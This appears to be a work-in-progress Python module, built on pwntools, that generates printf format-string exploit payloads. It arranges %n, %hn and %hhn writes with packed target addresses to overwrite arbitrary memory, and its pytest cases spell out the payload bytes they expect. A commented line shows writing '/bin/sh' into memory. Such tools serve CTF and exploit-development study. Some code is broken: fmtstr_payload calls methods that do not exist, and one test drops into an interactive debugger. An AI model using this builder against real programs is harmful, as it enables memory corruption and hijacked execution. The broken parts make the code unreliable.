from __future__ import division
from pwnlib.log import getLogger
from pwnlib.context import context
from pwnlib.util.packing import flat, unpack
from pwnlib.exception import PwnlibException
from collections import OrderedDict
from math import floor, ceil
from textwrap import dedent
from bisect import insort, bisect
import pytest
from IPython import embed


log = getLogger('pwnlib.fmtstr_builder')
log.level = 'debug'


# TODO: Add support for maximum write size. Smaller write size means fewer
# characters are printed to stdout? Is this important? You should first run
# some tests to see what happens when you overload stdout with many GB of data


class FmtStrTooLong(PwnlibException):
    pass

class CantSplitWrite(PwnlibException):
    pass


class Write(object):
    """
    The maximum number of characters to pad with is 2147483614 on my system,
    which is slightly less than 2**31, max signed int. Printf fails with error
    code 255 ()
    """

    size_modifiers = {"byte": b"hh", "short": b"h", "int": b""}
    size_bounds = {
        "byte": (0, 0xff), "short": (0, 0xffff), "int": (0, 2147483614),
    }
    bits_to_size = {8: "byte", 16: "short", 32: "int"}
    size_to_bits = {"byte": 8, "short": 16, "int": 32}

    def __init__(self, builder, value, size):
        if isinstance(size, int):
            size = self.bits_to_size[size]
        self._validate_size(value, size)
        self.builder = builder
        self.size_modifier = self.size_modifiers[size]
        self.value = value
        self.bits = self.size_to_bits[size]

    def _validate_size(self, value, size):
        valid_sizes = list(self.size_modifiers)
        if size not in valid_sizes:
            log.error("'size' must be one of %s" % valid_sizes)
        lower, upper = self.size_bounds[size]
        if not lower <= value <= upper:
            log.error("Value %d (0x%x) is out of bounds for size '%s'" % (
                value, value, size))

    def build_fmtstr(self, prev_write):
        if prev_write is None:
            num_chars_to_print = self.value
        else:
            num_chars_to_print = self.value - prev_write.value

        assert num_chars_to_print >= 0, "bug"

        if num_chars_to_print == 0:
            print_chars = b""
        else:
            print_chars = b"%" + b"%d" % num_chars_to_print + b"c"

        return print_chars + b"%" + b"%d$%s" % (self.va, self.size_modifier) + b"n"

    def __lt__(self, other):
        return self.value < other.value


class VaWrite(Write):
    
    def __init__(self, va, *args, **kwargs):
        super(VaWrite, self).__init__(*args, **kwargs)
        self.va = va

    def __repr__(self):
        return "<va=%d value=0x%x>" % (self.va, self.value)

    def split(self):
        raise CantSplitWrite("Can't split va writes because we don't "
                "control the addresses")
        

class AddressWrite(Write):

    def __init__(self, address, *args, **kwargs):
        super(AddressWrite, self).__init__(*args, **kwargs)
        self.address = address

    def __repr__(self):
        return "<address=0x%x value=0x%x" % (self.address, self.value)

    @property
    def va(self):
        return self.builder.va_of_address(self.address)

    def split(self):
        if self.value <= 0xff:
            raise CantSplitWrite("Write value is too small to split")
        new_bits = self.bits//2
        mask = 2**(new_bits)-1
        new_size = self.bits_to_size[new_bits]

        a_low  = self.address
        a_high = self.address + new_bits//8

        if context.endianness == "little":
            a1 = a_low
            a2 = a_high
        elif context.endianness == "big":
            a1 = a_high
            a2 = a_low
        else:
            log.error("Well that's unexpected.")

        v1 = self.value & mask
        v2 = (self.value & mask << new_bits) >> new_bits
        w1 = self.__class__(a1, self.builder, v1, new_size)
        w2 = self.__class__(a2, self.builder, v2, new_size)
        return w1, w2


class Addresses(OrderedDict):

    def __repr__(self):
        return self.keys().__repr__()

    def add(self, address):
        log.debug("Adding address 0x%x" % address)
        self[address] = None

    def remove(self, address):
        log.debug("Removing address 0x%x" % address)
        self.pop(address, None)

    def index(self, address):
        return list(self.keys()).index(address)


class FmtStrBuilder(object):
    
    def __init__(self, base_va, strlen, pad_char=b"\0"):
        self.base_va = base_va
        self.addresses = Addresses()
        self.writes = []
        self.strlen = strlen
        self.custom_fmtstr = b""
        assert len(pad_char) == 1
        self.pad_char = pad_char

    def va_of_address(self, address):
        return (self.base_va 
                + self.strlen//context.bytes
                - len(self.addresses)
                + self.addresses.index(address))

    def write(self, value, size, address=None, va=None):
        """
        Add the ``address`` to the end of the printf payload then reference that
        address via `%m$n` where `m` is the corresponding vararg of printf.

        This only works when the format string is on a stack frame below
        (higher address) printf's frame and stack based calling convention is
        used. e.g., cdecl
        """
        if address is None and va is None:
            log.error("Must write to either an address or a va")
        if address is not None and va is not None:
            log.error("Can't write to both a va and an address at the "
                    "same time")
        if address is not None:
            if address in self.addresses:
                log.error("Already writing to address 0x%x" % address)
            insort(self.writes, AddressWrite(address, self, value, size))
            self.addresses.add(address)
        else:
            insort(self.writes, VaWrite(va, self, value, size))

    def write_byte(self, *args, **kwargs):
        self.write(size="byte", *args, **kwargs)

    def write_short(self, *args, **kwargs):
        self.write(size="short", *args, **kwargs)

    def write_int(self, *args, **kwargs):
        self.write(size="int", *args, **kwargs)

    def write_str(self, string, address, add_null=True):
        """
        Does not support writing to varargs, use the other fixed size write
        functions.
        """
        if add_null is True:
            string += b"\0"
        nbytes = 4
        while string:
            substr = string[:nbytes]
            if len(substr) < nbytes:
                string = substr
                nbytes //= 2
                continue
            value = unpack(substr, word_size=nbytes*8)
            write = AddressWrite(address, self, value, nbytes*8)
            insort(self.writes, write)
            self.addresses.add(address)
            # Adjust loop conditions
            string = string[len(substr):]
            address += nbytes

    def append_custom_fmtstr(self, custom_fmtstr):
        self.custom_fmtstr += custom_fmtstr

    @property
    def nchars_printed(self):
        """Return the number of characters that the format string will print.
        Does not account for custom fmtstr."""
        return self.writes[-1].value

    def optimize(self):
        # Test that we can successfully build it before attempting to optimize
        self._build_fmtstr()

        log.debug("Optimizing fmtstr")

        try:
            write = self.writes[-1]
        except IndexError:
            log.error("Format string is empty")

        while write:
            try:
                w1, w2 = write.split()
            except CantSplitWrite:
                return

            i1 = bisect(self.writes, w1)
            _  = insort(self.writes, w1)
            i2 = bisect(self.writes, w2)
            _  = insort(self.writes, w2)

            del self.writes[-1]

            self.addresses.remove(write.address)
            self.addresses.add(w1.address)
            self.addresses.add(w2.address)

            try:
                self._build_fmtstr()
            except FmtStrTooLong:
                del self.writes[i2]
                del self.writes[i1]
                self.writes.append(write)
                self.addresses.remove(w1.address)
                self.addresses.remove(w2.address)
                self.addresses.add(write.address)
                return

            write = self.writes[-1]

    def _build_fmtstr(self):
        fmtstr = b""
        prev_write = None
        for write in self.writes:
            fmtstr += write.build_fmtstr(prev_write)
            prev_write = write

        fmtstr += self.custom_fmtstr
        # Pad for alignment
        fmtstr += self.pad_char*(context.bytes - len(fmtstr)%context.bytes)

        addresses_str = flat(list(self.addresses))

        min_len = len(fmtstr) + len(addresses_str)
        if  min_len > self.strlen:
            raise FmtStrTooLong("Format string: '%s' and addresses: %s "
                    "are too long (%d) to fit into given strlen %d" % (
                        fmtstr, self.addresses, min_len, self.strlen))

        fmtstr += self.pad_char*(
                self.strlen - self.strlen%context.bytes
                - len(fmtstr) 
                - len(addresses_str))
        fmtstr += addresses_str
        fmtstr += self.pad_char*(self.strlen - len(fmtstr))

        return fmtstr
            
    @property
    def fmtstr(self):
        self.optimize()
        return self._build_fmtstr()


def fmtstr_payload(address_writes, va_writes, base_va, strlen):
    builder = FmtStrBuilder(base_va, strlen)

    for address, (value, size) in address_writes.items():
        builder.write_to_address(address, value, size)

    for va, (value, size) in va_writes.items():
        builder.write_to_va(va, value, size)

    return builder.fmtstr


# builder.write_int(800, address=0x9000)
# builder.write_short(800, address=0x9000)
# builder.write_byte(800, va=15)
# builder.write_string("/bin/sh\0", add_null=False)
# builder.make_fmtstr()

def test_write_str():
    context.arch = "i386" # 4 byte pointer size
    builder = FmtStrBuilder(1, 400)
    builder.write_str(b"\x01\x02\03\x04\x05\x06\x07", address=0x1)
    assert builder.fmtstr == (
            "%1c%99$hhn"
            "%1c%100$hhn"
            "%1c%97$hhn"
            "%1c%98$hhn"
            "%1c%95$hhn"
            "%1c%96$hhn"
            "%1c%94$hhn".ljust(400-4*7) +
            "\x07\x00\x00\x00" "\x05\x00\x00\x00"
            "\x06\x00\x00\x00" "\x03\x00\x00\x00"
            "\x04\x00\x00\x00" "\x01\x00\x00\x00"
            "\x02\x00\x00\x00"
    )


def test_2():
    context.arch = "amd64"
    builder = FmtStrBuilder(1, 400)
    builder.write_str(b"\x01\x02\03\x04\x05\x06\x07", address=0x1)
    embed()
    assert builder.fmtstr == (
            "%1c%99$hhn"
            "%1c%100$hhn"
            "%1c%97$hhn"
            "%1c%98$hhn"
            "%1c%95$hhn"
            "%1c%96$hhn"
            "%1c%94$hhn".ljust(400-8*7) +
            "\x07\x00\x00\x00\x00\x00\x00\x00" "\x05\x00\x00\x00\x00\x00\x00\x00"
            "\x06\x00\x00\x00\x00\x00\x00\x00" "\x03\x00\x00\x00\x00\x00\x00\x00"
            "\x04\x00\x00\x00\x00\x00\x00\x00" "\x01\x00\x00\x00\x00\x00\x00\x00"
            "\x02\x00\x00\x00\x00\x00\x00\x00"
    )


def test_():
    context.arch = "i386" # 4 byte pointer size

    builder = FmtStrBuilder(0, 100)

    builder.write_byte(100, address=0x41414141)
    assert builder.fmtstr == (
            "%100c%24$hhn".ljust(96) + "\x41\x41\x41\x41")

    with pytest.raises(PwnlibException) as e:
        builder.write_short(200, address=0x41414141)
    assert "Already writing to address" in str(e.value)

    builder.write_short(200, address=0x42424242)
    assert builder.fmtstr == (
            "%100c%23$hhn" "%100c%24$hn".ljust(92) + 
            "\x41\x41\x41\x41" "\x42\x42\x42\x42")

    # Short should get split into two smaller byte writes
    builder.write_short(256, address=0x0000)
    assert builder.fmtstr == (
            "%23$hhn"
            "%1c%24$hhn" 
            "%99c%21$hhn" 
            "%100c%22$hn".ljust(84) + 
            "\x41\x41\x41\x41" "\x42\x42\x42\x42" 
            # Two addresses for the one short
            "\x00\x00\x00\x00" "\x01\x00\x00\x00")

    builder.strlen = 1000
    builder.write_int(0x10111213, address=0x1000)
    assert builder.fmtstr == (
            "%244$hhn"
            "%1c%245$hhn" 
            "%15c%249$hhn" # int
            "%1c%248$hhn" # int
            "%1c%247$hhn" # int
            "%1c%246$hhn" # int
            "%81c%242$hhn" # Write 100 to 0x41414141
            "%100c%243$hn".ljust(968) + # Write 200 to 0x42424242
            "\x41\x41\x41\x41" "\x42\x42\x42\x42" 
            # Two addresses for the one short
            "\x00\x00\x00\x00" "\x01\x00\x00\x00"
            # Four addresses for the one int
            "\x00\x10\x00\x00" "\x01\x10\x00\x00"
            "\x02\x10\x00\x00" "\x03\x10\x00\x00")

    # builder = FmtStrBuilder(10, 20)
    # builder.write_to_address(0x41414141, 7, 'int')
    # assert builder.fmtstr == (
    #         "%7c%" "14$n" "    " "    " "\x41\x41\x41\x41")

    # builder.strlen = 24
    # builder.write_to_address(0x42424242, 7, 'int')
    # assert builder.fmtstr == (
    #         "%7c%" "14$n" "%15$" "n   " "\x41\x41\x41\x41" "\x42\x42\x42\x42")

    # builder.strlen = 32
    # builder.write_to_va(300, 8, 'int')
    # assert builder.fmtstr == (
    #         "%7c%" "16$n" "%17$" "n%1c" 
    #         "%300" "$n  " "\x41\x41\x41\x41" "\x42\x42\x42\x42")

    # builder.strlen = 44
    # builder.write_to_address(0x43434343, 9, 'int')
    # assert builder.fmtstr == (
    #         "%7c%" "18$n" "%19$" "n%1c" 
    #         "%300" "$n%1" "c%20" "$n  " 
    #         "\x41\x41\x41\x41" "\x42\x42\x42\x42" "\x43\x43\x43\x43")


if __name__ == "__main__":
    test_2()
